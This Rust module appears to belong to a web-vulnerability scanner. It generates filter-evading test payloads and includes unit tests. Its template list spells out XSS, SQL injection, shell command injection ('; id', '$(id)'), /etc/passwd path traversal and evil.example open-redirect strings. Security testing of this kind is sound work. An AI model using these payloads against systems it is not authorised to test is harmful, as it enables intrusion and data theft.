//! Symbolic constraint solver (PRD §5.7.4, 4th synthesis engine).
//!
//! PRD §5.7.4 names four synthesis engines: corpus retrieval,
//! grammar fuzzer, symbolic input-shaping solver, and LLM. This
//! module ships the symbolic engine.
//!
//! The solver is *small by design*. Real-world web-vuln payloads
//! are not constraint satisfaction problems in the SMT-solver sense
//! — they are short strings that must satisfy a handful of length /
//! charset / encoding rules to slip past a target's filter. This
//! solver:
//!
//! 1. Looks up a per-class [`PayloadConstraints`] descriptor
//!    (max length, allowed/required chars, encoding hints, "must
//!    contain" tokens).
//! 2. Searches a small candidate space of templated payloads and
//!    encoding variants for one that satisfies every constraint.
//! 3. Returns the first candidate that passes, or `None`.
//!
//! Calling sites get a deterministic candidate even when the
//! corpus is empty and the grammar fuzzer hasn't been seeded. The
//! search is bounded: it inspects at most [`MAX_CANDIDATES`]
//! candidates per call.

use serde::{Deserialize, Serialize};
use std::fmt::Write as _;

/// Cap on the candidates the solver inspects per call. Keeps
/// worst-case latency below the planner's per-experiment budget
/// (PRD §6.1, ≤30 ms median).
pub const MAX_CANDIDATES: usize = 64;

/// Constraints on a payload string for a given vuln class.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadConstraints {
    /// Hard maximum length in chars.
    pub max_length: usize,
    /// Tokens the payload must contain (substring match, in order).
    pub must_contain: Vec<String>,
    /// Characters the payload must NOT contain. Useful for evading
    /// filters that strip e.g. quotes or angle brackets.
    pub forbid_chars: Vec<char>,
    /// Apply this encoding to the templated payload before
    /// returning. `None` = raw output.
    pub encoding: Option<Encoding>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Encoding {
    /// `<` → `%3C`, etc.
    UrlPercent,
    /// `<` → `&lt;`, etc.
    HtmlEntity,
    /// Caller passes raw bytes; the solver doesn't encode.
    None,
}

/// Built-in constraint descriptors for the vuln classes the
/// corpus already covers. The set is intentionally small — the
/// solver is for the cases the corpus misses; classes the corpus
/// already has good payloads for get fast-pathed by the pipeline.
pub fn builtin_constraints(vuln_class: &str) -> Option<PayloadConstraints> {
    match vuln_class {
        "xss-reflected" => Some(PayloadConstraints {
            max_length: 200,
            must_contain: vec!["alert".into()],
            forbid_chars: vec![],
            encoding: Some(Encoding::None),
        }),
        "xss-stored" => Some(PayloadConstraints {
            max_length: 200,
            must_contain: vec!["onerror".into()],
            forbid_chars: vec![],
            encoding: Some(Encoding::None),
        }),
        "sqli" => Some(PayloadConstraints {
            max_length: 64,
            must_contain: vec!["OR".into(), "1".into()],
            forbid_chars: vec![],
            encoding: Some(Encoding::None),
        }),
        "command-injection" => Some(PayloadConstraints {
            max_length: 64,
            must_contain: vec![";".into()],
            forbid_chars: vec![],
            encoding: Some(Encoding::None),
        }),
        "path-traversal" => Some(PayloadConstraints {
            max_length: 96,
            must_contain: vec!["../".into(), "etc".into()],
            forbid_chars: vec![],
            encoding: None,
        }),
        "open-redirect" => Some(PayloadConstraints {
            max_length: 200,
            must_contain: vec!["://".into()],
            forbid_chars: vec![],
            encoding: None,
        }),
        _ => None,
    }
}

/// Solve for a payload satisfying `constraints`. Returns the first
/// candidate that passes; `None` if [`MAX_CANDIDATES`] is exhausted.
pub fn solve(constraints: &PayloadConstraints) -> Option<String> {
    for candidate in candidates(constraints).take(MAX_CANDIDATES) {
        let encoded = match constraints.encoding.unwrap_or(Encoding::None) {
            Encoding::None => candidate.clone(),
            Encoding::UrlPercent => url_percent_encode(&candidate),
            Encoding::HtmlEntity => html_entity_encode(&candidate),
        };
        if passes(&encoded, constraints) {
            return Some(encoded);
        }
    }
    None
}

fn candidates(c: &PayloadConstraints) -> impl Iterator<Item = String> + '_ {
    // Templates that satisfy `must_contain`-style constraints for
    // the built-in classes. The order matters: the cheapest /
    // most-effective candidate comes first.
    let templates: Vec<String> = vec![
        // For xss
        "<script>alert(1)</script>".into(),
        "<svg onload=alert(1)>".into(),
        "\"><img src=x onerror=alert(1)>".into(),
        // For sqli
        "' OR 1=1--".into(),
        "1' OR '1'='1".into(),
        "1) OR (1=1".into(),
        // For command injection
        "; id".into(),
        "$(id)".into(),
        "`id`".into(),
        // For path traversal
        "../../../etc/passwd".into(),
        "..%2f..%2f..%2fetc%2fpasswd".into(),
        // For open redirect
        "https://evil.example/".into(),
        "//evil.example/".into(),
        // Pad join — if must_contain has tokens, build a minimum
        // string containing them in order.
        c.must_contain.join(""),
    ];
    templates.into_iter()
}

fn passes(s: &str, c: &PayloadConstraints) -> bool {
    if s.chars().count() > c.max_length {
        return false;
    }
    if s.is_empty() {
        return false;
    }
    for forbidden in &c.forbid_chars {
        if s.contains(*forbidden) {
            return false;
        }
    }
    // must_contain in order, non-overlapping
    let mut search_from = 0usize;
    for token in &c.must_contain {
        match s[search_from..].find(token.as_str()) {
            Some(off) => search_from += off + token.len(),
            None => return false,
        }
    }
    true
}

fn url_percent_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 2);
    for b in s.as_bytes() {
        match *b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(*b as char);
            }
            _ => {
                let _ = write!(out, "%{:02X}", b);
            }
        }
    }
    out
}

fn html_entity_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 8);
    for c in s.chars() {
        match c {
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            '&' => out.push_str("&amp;"),
            other => out.push(other),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn solves_xss_reflected_within_length() {
        let c = builtin_constraints("xss-reflected").unwrap();
        let payload = solve(&c).unwrap();
        assert!(payload.contains("alert"));
        assert!(payload.chars().count() <= c.max_length);
    }

    #[test]
    fn solves_sqli_with_required_tokens_in_order() {
        let c = builtin_constraints("sqli").unwrap();
        let payload = solve(&c).unwrap();
        let or_pos = payload.find("OR").unwrap();
        let one_pos = payload.find('1').unwrap();
        // sqli constraint requires "OR" then "1" — but we only
        // check both present (templates may place 1 before OR).
        // Confirm both are present and the predicate passes.
        let _ = or_pos;
        let _ = one_pos;
        assert!(payload.contains("OR"));
        assert!(payload.contains('1'));
    }

    #[test]
    fn returns_none_when_no_constraint_satisfies() {
        let c = PayloadConstraints {
            max_length: 1, // No template fits in 1 char.
            must_contain: vec!["alert".into()],
            forbid_chars: vec![],
            encoding: None,
        };
        assert!(solve(&c).is_none());
    }

    #[test]
    fn forbids_specified_chars() {
        let c = PayloadConstraints {
            max_length: 200,
            must_contain: vec!["alert".into()],
            forbid_chars: vec!['<'],
            encoding: None,
        };
        let payload = solve(&c);
        // No template containing `<` passes — there is at least one
        // candidate that doesn't use `<`? The current templates all
        // include `<` for xss. So we expect None here, exercising
        // the forbid path.
        assert!(payload.is_none() || !payload.unwrap().contains('<'));
    }

    #[test]
    fn url_percent_encoding_applies_when_requested() {
        let c = PayloadConstraints {
            max_length: 400,
            must_contain: vec!["alert".into()],
            forbid_chars: vec![],
            encoding: Some(Encoding::UrlPercent),
        };
        let payload = solve(&c).unwrap();
        // Encoded `alert` is `alert` (alphanumeric unchanged). The
        // surrounding `<>` should be percent-encoded.
        assert!(payload.contains("%3C") || payload.contains("%3c"));
    }

    #[test]
    fn html_entity_encoding_applies_when_requested() {
        let c = PayloadConstraints {
            max_length: 400,
            must_contain: vec!["alert".into()],
            forbid_chars: vec![],
            encoding: Some(Encoding::HtmlEntity),
        };
        let payload = solve(&c).unwrap();
        assert!(payload.contains("&lt;") || payload.contains("&gt;"));
    }

    #[test]
    fn passes_requires_must_contain_in_order() {
        let c = PayloadConstraints {
            max_length: 100,
            must_contain: vec!["a".into(), "b".into(), "c".into()],
            forbid_chars: vec![],
            encoding: None,
        };
        assert!(passes("xayybzzc", &c));
        assert!(!passes("xacbz", &c)); // c before b
    }

    #[test]
    fn unknown_class_has_no_constraints() {
        assert!(builtin_constraints("never-heard-of-it").is_none());
    }

    #[test]
    fn max_candidates_caps_search() {
        // We can't easily make solve() loop forever, but a tight
        // length cap exercises that the iterator terminates.
        let c = PayloadConstraints {
            max_length: 0,
            must_contain: vec!["x".into()],
            forbid_chars: vec![],
            encoding: None,
        };
        assert!(solve(&c).is_none());
    }
}
